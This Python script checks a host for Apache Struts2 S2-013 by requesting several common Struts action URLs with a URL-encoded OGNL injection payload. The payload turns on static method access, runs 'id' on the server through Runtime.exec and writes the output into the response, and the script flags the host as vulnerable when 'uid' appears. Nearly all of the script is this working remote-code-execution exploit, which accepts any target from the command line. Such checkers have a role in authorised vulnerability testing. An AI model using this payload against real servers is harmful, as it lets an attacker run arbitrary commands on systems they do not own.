try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs =  ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/link.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs :
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)


    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            try:
                req = requests.get(url + '''?a=%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close())%7D''',timeout=3)
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-013 in ' + self.ip)
                    os._exit(1)
            except:
                pass
        logging.info('[-] S2-013 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

